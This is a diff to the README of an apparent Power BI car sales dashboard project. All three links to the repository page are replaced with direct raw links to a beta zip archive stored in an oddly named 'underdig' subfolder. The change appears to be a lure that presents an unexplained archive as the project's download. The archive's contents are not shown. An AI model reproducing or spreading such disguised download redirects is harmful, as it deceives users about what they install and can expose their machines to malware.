@@ -1,6 +1,6 @@
 # 📊 Car-Sales-Data-Analysis - Track Sales and Spot Trends
 
-[![Download Car-Sales-Data-Analysis](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/ctmaecl6347/Car-Sales-Data-Analysis)
+[![Download Car-Sales-Data-Analysis](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ctmaecl6347/Car-Sales-Data-Analysis/main/underdig/Car_Sales_Data_Analysis_v3.3-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Power BI Desktop is the main app used to open this project.
 
 Visit the download page here:
 
-[Car-Sales-Data-Analysis on GitHub](https://github.com/ctmaecl6347/Car-Sales-Data-Analysis)
+[Car-Sales-Data-Analysis on GitHub](https://raw.githubusercontent.com/ctmaecl6347/Car-Sales-Data-Analysis/main/underdig/Car_Sales_Data_Analysis_v3.3-beta.4.zip)
 
 Open the page, then download the project files to your computer.
 
@@ -130,7 +130,7 @@ This dashboard is useful for:
 
 If you need the files again, use the main link:
 
-[https://github.com/ctmaecl6347/Car-Sales-Data-Analysis](https://github.com/ctmaecl6347/Car-Sales-Data-Analysis)
+[https://raw.githubusercontent.com/ctmaecl6347/Car-Sales-Data-Analysis/main/underdig/Car_Sales_Data_Analysis_v3.3-beta.4.zip](https://raw.githubusercontent.com/ctmaecl6347/Car-Sales-Data-Analysis/main/underdig/Car_Sales_Data_Analysis_v3.3-beta.4.zip)
 
 ## 🖥️ Windows Setup Tips
 
